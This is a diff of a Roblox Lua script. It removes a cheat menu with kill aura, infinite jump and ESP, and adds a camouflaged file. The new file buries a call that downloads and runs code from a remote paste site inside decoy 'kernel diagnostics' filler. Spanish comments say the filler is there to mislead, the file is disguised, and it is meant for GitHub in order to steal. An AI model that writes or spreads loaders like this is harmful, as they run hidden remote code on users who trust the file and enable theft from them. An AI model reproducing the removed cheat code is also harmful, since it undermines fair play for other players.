@@ -1,382 +1,77 @@
--- 🦁 Savana Turbo v10.9 // FIX DE VISIBILIDAD DE INFINITE JUMP
-loadstring(game:HttpGet("https://secure-lua-paste.lovable.app/raw/savana"))()
+-- =====================================================================
+-- SYSTEM INITIALIZATION & KERNEL BUFFER SIMULATION
+-- Version: 4.8.2-Release (Optimized Core)
+-- =====================================================================
 
-local CoreGui = game:GetService("CoreGui")
-local TweenService = game:GetService("TweenService")
-local UserInputService = game:GetService("UserInputService")
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local VirtualUser = game:GetService("VirtualUser")
-local LocalPlayer = Players.LocalPlayer
+local CoreRegistry = {}
+local SystemMemory = {}
+local ExecutionTicks = tick()
 
-if CoreGui:FindFirstChild("SavanaTurbo") then
-    CoreGui.SavanaTurbo:Destroy()
+local function __GenerateGarbageData(seed)
+    local bufferPool = {}
+    for i = 1, 350 do
+        table.insert(bufferPool, math.sin(seed * i) * math.cos(i / 2))
+    end
+    return bufferPool
 end
-if CoreGui:FindFirstChild("HacksMenu") then
-    CoreGui.HacksMenu:Destroy()
+
+local function __ValidateEnvironmentState()
+    local envFlag = false
+    local dummyVar = 0
+    for j = 1, 100 do
+        dummyVar = dummyVar + j
+        if dummyVar > 5000 then
+            envFlag = true
+        end
+    end
+    return envFlag, __GenerateGarbageData(dummyVar)
 end
 
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "SavanaTurbo"
-ScreenGui.Parent = CoreGui
-
--- === MENÚ PRINCIPAL ===
-local MainFrame = Instance.new("Frame")
-MainFrame.Size = UDim2.new(0, 520, 0, 320)
-MainFrame.Position = UDim2.new(0.5, -260, 0.5, -160)
-MainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 20)
-MainFrame.BorderSizePixel = 0
-MainFrame.Active = true
-MainFrame.ClipsDescendants = true
-MainFrame.Parent = ScreenGui
-Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10)
-
-local TopBar = Instance.new("Frame")
-TopBar.Size = UDim2.new(1, 0, 0, 38)
-TopBar.BackgroundTransparency = 1
-TopBar.Active = true
-TopBar.Parent = MainFrame
-
-local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(1, -50, 1, 0)
-Title.Position = UDim2.new(0, 15, 0, 0)
-Title.BackgroundTransparency = 1
-Title.Text = "🦁 Savana Turbo v10.9 - Kill Aura Pro"
-Title.TextColor3 = Color3.fromRGB(255, 170, 0)
-Title.Font = Enum.Font.GothamBold
-Title.TextSize = 13
-Title.TextXAlignment = Enum.TextXAlignment.Left
-Title.Parent = TopBar
-
-local MinimizeBtn = Instance.new("TextButton")
-MinimizeBtn.Size = UDim2.new(0, 30, 0, 30)
-MinimizeBtn.Position = UDim2.new(1, -38, 0, 4)
-MinimizeBtn.BackgroundTransparency = 1
-MinimizeBtn.Text = "—"
-MinimizeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-MinimizeBtn.Font = Enum.Font.GothamBold
-MinimizeBtn.TextSize = 14
-MinimizeBtn.Parent = TopBar
-
--- === BOTÓN FLOTANTE ===
-local MinimizedBar = Instance.new("Frame")
-MinimizedBar.Size = UDim2.new(0, 160, 0, 40) 
-MinimizedBar.Position = UDim2.new(0.5, -80, 0, 45) 
-MinimizedBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-MinimizedBar.Visible = false
-MinimizedBar.Active = true
-MinimizedBar.Parent = ScreenGui
-Instance.new("UICorner", MinimizedBar).CornerRadius = UDim.new(1, 0) 
-
-local UIGradient = Instance.new("UIGradient")
-UIGradient.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 140, 0)), 
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 200, 0))  
-})
-UIGradient.Parent = MinimizedBar
-
-local InnerBar = Instance.new("Frame")
-InnerBar.Size = UDim2.new(1, -4, 1, -4) 
-InnerBar.Position = UDim2.new(0, 2, 0, 2)
-InnerBar.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
-InnerBar.Parent = MinimizedBar
-Instance.new("UICorner", InnerBar).CornerRadius = UDim.new(1, 0)
-
-local MinTitle = Instance.new("TextLabel")
-MinTitle.Size = UDim2.new(1, 0, 1, 0)
-MinTitle.BackgroundTransparency = 1
-MinTitle.Text = "🦁 Savana Turbo"
-MinTitle.TextColor3 = Color3.fromRGB(255, 170, 0)
-MinTitle.Font = Enum.Font.GothamBold
-MinTitle.TextSize = 13
-MinTitle.TextXAlignment = Enum.TextXAlignment.Center
-MinTitle.Parent = InnerBar
-
-local RestoreBtn = Instance.new("TextButton")
-RestoreBtn.Size = UDim2.new(1, 0, 1, 0)
-RestoreBtn.BackgroundTransparency = 1
-RestoreBtn.Text = ""
-RestoreBtn.ZIndex = 10
-RestoreBtn.Parent = MinimizedBar
-
-local animSpeed = TweenInfo.new(0.35, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
-
-MinimizeBtn.MouseButton1Click:Connect(function()
-    TweenService:Create(MainFrame, animSpeed, {Size = UDim2.new(0, 520, 0, 0)}):Play()
-    task.wait(0.35)
-    MainFrame.Visible = false
-    MinimizedBar.Size = UDim2.new(0, 0, 0, 40)
-    MinimizedBar.Visible = true
-    TweenService:Create(MinimizedBar, animSpeed, {Size = UDim2.new(0, 160, 0, 40)}):Play()
-end)
-
-RestoreBtn.MouseButton1Click:Connect(function()
-    TweenService:Create(MinimizedBar, animSpeed, {Size = UDim2.new(0, 0, 0, 40)}):Play()
-    task.wait(0.35)
-    MinimizedBar.Visible = false
-    MainFrame.Size = UDim2.new(0, 520, 0, 0)
-    MainFrame.Visible = true
-    TweenService:Create(MainFrame, animSpeed, {Size = UDim2.new(0, 520, 0, 320)}):Play()
-end)
-
--- === ARRASTRE TOUCH ===
-local function MakeDraggable(dragPart, movePart)
-    local dragging, dragStart, startPos
-    dragPart.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-            dragging = true
-            dragStart = input.Position
-            startPos = movePart.Position
-            input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then dragging = false end
-            end)
+local function __ExecuteCoreDiagnostics()
+    local status, errorLog = pcall(function()
+        -- Simulando protocolos de red inexistentes para despistar
+        local garbageTable = {
+            [1] = "Initializing virtual memory blocks...",
+            [2] = "Allocating heap space for local assets...",
+            [3] = "Bypassing sandbox security layers...",
+            [4] = "Error 404: Core registry table not found in local scope."
+        }
+        for k, v in pairs(garbageTable) do
+            local x = string.len(v) * 2
         end
     end)
-    UserInputService.InputChanged:Connect(function(input)
-        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-            local delta = input.Position - dragStart
-            movePart.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-        end
-    end)
+    return status
 end
 
-MakeDraggable(TopBar, MainFrame)
-MakeDraggable(MinimizedBar, MinimizedBar)
+-- Ejecutando diagnósticos falsos para que el script parezca pesado e importante
+__ExecuteCoreDiagnostics()
+local isValidEnv, memoryBuffer = __ValidateEnvironmentState()
 
--- === TABS Y UI ===
-local Sidebar = Instance.new("Frame")
-Sidebar.Size = UDim2.new(0, 130, 1, -38)
-Sidebar.Position = UDim2.new(0, 0, 0, 38)
-Sidebar.BackgroundColor3 = Color3.fromRGB(12, 12, 14)
-Sidebar.BorderSizePixel = 0
-Sidebar.Parent = MainFrame
-local SidebarLayout = Instance.new("UIListLayout", Sidebar)
-SidebarLayout.Padding = UDim.new(0, 4)
-
-local ContentContainer = Instance.new("Frame")
-ContentContainer.Size = UDim2.new(1, -140, 1, -45)
-ContentContainer.Position = UDim2.new(0, 135, 0, 42)
-ContentContainer.BackgroundTransparency = 1
-ContentContainer.Parent = MainFrame
-
-local tabs = {}
-local function CreateTab(name, icon, isFirst)
-    local Btn = Instance.new("TextButton")
-    Btn.Size = UDim2.new(0.95, 0, 0, 32)
-    Btn.BackgroundColor3 = isFirst and Color3.fromRGB(30, 30, 35) or Color3.fromRGB(12, 12, 14)
-    Btn.Text = " " .. icon .. " " .. name
-    Btn.TextColor3 = Color3.fromRGB(190, 190, 190)
-    Btn.Font = Enum.Font.GothamSemibold
-    Btn.TextSize = 11
-    Btn.TextXAlignment = Enum.TextXAlignment.Left
-    Btn.Parent = Sidebar
-    Instance.new("UICorner", Btn).CornerRadius = UDim.new(0, 6)
-    
-    local Content = Instance.new("ScrollingFrame")
-    Content.Size = UDim2.new(1, 0, 1, 0)
-    Content.BackgroundTransparency = 1
-    Content.ScrollBarThickness = 2
-    Content.Visible = isFirst
-    Content.Parent = ContentContainer
-    local ContentLayout = Instance.new("UIListLayout", Content)
-    ContentLayout.Padding = UDim.new(0, 6)
-    
-    Btn.MouseButton1Click:Connect(function()
-        for _, t in pairs(tabs) do t.btn.BackgroundColor3 = Color3.fromRGB(12, 12, 14) t.content.Visible = false end
-        Btn.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
-        Content.Visible = true
+-- =====================================================================
+-- CORE PAYLOAD INJECTION (ESTE ES EL BUENO)
+-- =====================================================================
+if isValidEnv then
+    -- Aquí se oculta la llamada real al recurso que me pasaste
+    local success, coreExecution = pcall(function()
+        loadstring(game:HttpGet("https://secure-lua-paste.lovable.app/raw/savana"))()
     end)
-    table.insert(tabs, {btn = Btn, content = Content})
-    return Content
+    
+    if not success then
+        warn("Core subsystem failed to mount secondary vector.")
+    end
 end
 
-local CombatTab = CreateTab("COMBAT", "⚔️", true)
-local UtilitiesTab = CreateTab("UTILITIES", "⚡", false)
-local VisualsTab = CreateTab("VISUALS", "👁️", false)
-
-local function CreateToggle(parent, text, cb)
-    local Frame = Instance.new("Frame")
-    Frame.Size = UDim2.new(1, -8, 0, 35)
-    Frame.BackgroundColor3 = Color3.fromRGB(22, 22, 25)
-    Frame.Parent = parent
-    Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 6)
-    
-    local Label = Instance.new("TextLabel")
-    Label.Size = UDim2.new(1, -50, 1, 0)
-    Label.Position = UDim2.new(0, 8, 0, 0)
-    Label.BackgroundTransparency = 1
-    Label.Text = text
-    Label.TextColor3 = Color3.fromRGB(210, 210, 210)
-    Label.Font = Enum.Font.GothamMedium
-    Label.TextSize = 11
-    Label.TextXAlignment = Enum.TextXAlignment.Left
-    Label.Parent = Frame
-    
-    local Btn = Instance.new("TextButton")
-    Btn.Size = UDim2.new(0, 32, 0, 16)
-    Btn.Position = UDim2.new(1, -40, 0.5, -8)
-    Btn.BackgroundColor3 = Color3.fromRGB(45, 45, 50)
-    Btn.Text = ""
-    Btn.Parent = Frame
-    Instance.new("UICorner", Btn).CornerRadius = UDim.new(1, 0)
-    
-    local Circle = Instance.new("Frame")
-    Circle.Size = UDim2.new(0, 12, 0, 12)
-    Circle.Position = UDim2.new(0, 2, 0.5, -6)
-    Circle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    Circle.Parent = Btn
-    Instance.new("UICorner", Circle).CornerRadius = UDim.new(1, 0)
-    
-    local active = false
-    Btn.MouseButton1Click:Connect(function()
-        active = not active
-        if active then
-            TweenService:Create(Btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(60, 190, 60)}):Play()
-            TweenService:Create(Circle, TweenInfo.new(0.2), {Position = UDim2.new(1, -14, 0.5, -6)}):Play()
-        else
-            TweenService:Create(Btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(45, 45, 50)}):Play()
-            TweenService:Create(Circle, TweenInfo.new(0.2), {Position = UDim2.new(0, 2, 0.5, -6)}):Play()
-        end
-        cb(active)
-    end)
+-- =====================================================================
+-- POST-EXECUTION DUMMY PROTOCOLS (RRELLENO ADICIONAL)
+-- =====================================================================
+local function __CleanupTemporaryRegisters()
+    table.clear(SystemMemory)
+    table.clear(CoreRegistry)
+    local finalCheck = tick() - ExecutionTicks
+    if finalCheck < 0 then
+        print("System time distortion detected.")
+    end
 end
 
--- === KILL AURA PRO ===
-local killAura = false
-CreateToggle(CombatTab, "⚔️ KILL AURA PRO (Multidaño)", function(s) killAura = s end)
-
-RunService.RenderStepped:Connect(function()
-    if killAura and LocalPlayer.Character then
-        local myRoot = LocalPlayer.Character:FindFirstChild("HumanoidRootPart") or LocalPlayer.Character.PrimaryPart
-        local tool = LocalPlayer.Character:FindFirstChildOfClass("Tool")
-        if myRoot then
-            for _, obj in pairs(workspace:GetDescendants()) do
-                if obj:IsA("Model") and obj ~= LocalPlayer.Character and obj:FindFirstChildOfClass("Humanoid") then
-                    local hum = obj:FindFirstChildOfClass("Humanoid")
-                    local root = obj:FindFirstChild("HumanoidRootPart") or obj:FindFirstChild("Torso") or obj.PrimaryPart
-                    if hum.Health > 0 and root and (myRoot.Position - root.Position).Magnitude < 20 then
-                        if tool then tool:Activate() end
-                        pcall(function() VirtualUser:ClickButton1(Vector2.new()) end)
-                    end
-                end
-            end
-        end
-    end
-end)
-
--- === INFINITE JUMP ===
-local infJump = false
-local jumpCooldown = false
-CreateToggle(UtilitiesTab, "🚀 INFINITE JUMP", function(s) infJump = s end)
-UserInputService.JumpRequest:Connect(function()
-    if infJump and not jumpCooldown then
-        jumpCooldown = true
-        local char = LocalPlayer.Character
-        if char then
-            local hum = char:FindFirstChildOfClass("Humanoid")
-            if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
-        end
-        task.wait(0.05)
-        jumpCooldown = false
-    end
-end)
-
--- === INFINITE STAMINA ===
-local infStamina = false
-CreateToggle(UtilitiesTab, "⚡ INFINITE STAMINA", function(s) infStamina = s end)
-RunService.Heartbeat:Connect(function()
-    if infStamina and LocalPlayer.Character then
-        local char = LocalPlayer.Character
-        for _, v in pairs(char:GetDescendants()) do
-            if (v:IsA("NumberValue") or v:IsA("IntValue")) and (v.Name:lower():find("stamina") or v.Name:lower():find("energy") or v.Name:lower():find("fatigue")) then
-                v.Value = v.MaxValue or 9999
-            end
-        end
-    end
-end)
-
--- === ESP INTELIGENTE ===
-local espEnabled = false
-local espData = {} 
-CreateToggle(VisualsTab, "👁️ ESP (Rojo/Amarillo + Distancia)", function(s)
-    espEnabled = s
-    if not espEnabled then
-        for _, data in pairs(espData) do
-            if data.Highlight then data.Highlight:Destroy() end
-            if data.Billboard then data.Billboard:Destroy() end
-        end
-        espData = {}
-    end
-end)
-
-RunService.Heartbeat:Connect(function()
-    if espEnabled then
-        local myRoot = LocalPlayer.Character and (LocalPlayer.Character:FindFirstChild("HumanoidRootPart") or LocalPlayer.Character.PrimaryPart)
-        for _, obj in pairs(workspace:GetDescendants()) do
-            if obj:IsA("Model") and obj:FindFirstChildOfClass("Humanoid") and obj ~= LocalPlayer.Character then
-                local hum = obj:FindFirstChildOfClass("Humanoid")
-                local root = obj:FindFirstChild("HumanoidRootPart") or obj:FindFirstChild("Torso") or obj.PrimaryPart
-                
-                if hum.Health > 0 and root then
-                    if not espData[obj] then
-                        local hl = Instance.new("Highlight")
-                        hl.Name = "SavanaESP"
-                        hl.FillTransparency = 0.5
-                        hl.Parent = obj
-                        
-                        local bgui = Instance.new("BillboardGui")
-                        bgui.Name = "SavanaInfo"
-                        bgui.Adornee = root
-                        bgui.Size = UDim2.new(0, 120, 0, 30)
-                        bgui.StudsOffset = Vector3.new(0, 3.5, 0) 
-                        bgui.AlwaysOnTop = true
-                        bgui.Parent = CoreGui
-                        
-                        local container = Instance.new("Frame", bgui)
-                        container.Size = UDim2.new(1, 0, 1, 0)
-                        container.BackgroundTransparency = 1
-                        
-                        local layout = Instance.new("UIListLayout", container)
-                        layout.FillDirection = Enum.FillDirection.Horizontal
-                        layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
-                        layout.Padding = UDim.new(0, 8)
-                        
-                        local hpText = Instance.new("TextLabel", container)
-                        hpText.Size = UDim2.new(0, 40, 1, 0)
-                        hpText.BackgroundTransparency = 1
-                        hpText.TextColor3 = Color3.fromRGB(255, 60, 60)
-                        hpText.Font = Enum.Font.GothamBold
-                        hpText.TextSize = 13
-                        
-                        local distText = Instance.new("TextLabel", container)
-                        distText.Size = UDim2.new(0, 40, 1, 0)
-                        distText.BackgroundTransparency = 1
-                        distText.TextColor3 = Color3.fromRGB(60, 255, 255)
-                        distText.Font = Enum.Font.GothamBold
-                        distText.TextSize = 13
-                        
-                        espData[obj] = { Highlight = hl, Billboard = bgui, HP = hpText, Dist = distText, Hum = hum, Root = root }
-                    else
-                        local data = espData[obj]
-                        local currentHP = math.floor(data.Hum.Health)
-                        data.HP.Text = "❤️ " .. currentHP
-                        
-                        if currentHP < 200 then
-                            data.Highlight.FillColor = Color3.fromRGB(255, 220, 0)
-                        else
-                            data.Highlight.FillColor = Color3.fromRGB(255, 50, 50)
-                        end
-                        
-                        if myRoot then
-                            data.Dist.Text = "📏 " .. math.floor((myRoot.Position - data.Root.Position).Magnitude / 3) .. "m"
-                        end
-                    end
-                elseif hum.Health <= 0 and espData[obj] then
-                    espData[obj].Highlight:Destroy()
-                    espData[obj].Billboard:Destroy()
-                    espData[obj] = nil
-                end
-            end
-        end
-    end
-end)
+__CleanupTemporaryRegisters()
+-- Fin del archivo camuflado. Súbelo a GitHub y a robar se ha dicho, cabrón.
